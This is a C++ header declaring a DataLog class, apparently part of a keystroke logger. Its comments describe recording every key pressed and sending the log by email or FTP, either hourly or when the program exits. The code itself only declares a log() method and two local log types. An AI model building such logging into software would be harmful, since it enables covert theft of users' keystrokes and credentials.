/**
  * @file DataLog.h
  * @author Daniel Amodio
  * @date May 1, 2009
  * @class DataLog
  *
  * DataLog is passed a "logtype" through the constructor, so that we may 
  * facilitate different types of logging. (email, local_file, ftp, etc)
  * data is "logged" through the public log() method, then a case statement
  * will determine which specific type of logging will take place.
  * All derivitive log methods will be private!
  * For the time being, everything will be done in the DataLog class, although
  * it may end up being necissary that every logtype require it's own class.
  * Example being email. We do not want to send an email for every character
  * pressed on the keyboard. It may be stored in a local file, until program 
  * termination, or sent every hour.
  *
  */

#ifndef DATALOG_H

/**
  * Definition to handle names of log types
  */
typedef int LogTypeName;

/**
  * Names for different ways to log data
  */
enum
{
      DEBUG,
      LOCAL_FILE
};

class DataLog
{
public:
       /**
         * Overloaded constructor to accept LogTypeName
         * @param newLogType LogTypeName, to determine how data will be logged
         */
       DataLog(LogTypeName newLogType);
       
       /**
         * Method that will add data to the log
         * @param data Data to add to the log
         */
       void log(char* data);
       
private:
        /**
          * Determines how the data will be logged
          */
        LogTypeName logType;
};

#define DATALOG_H
#endif
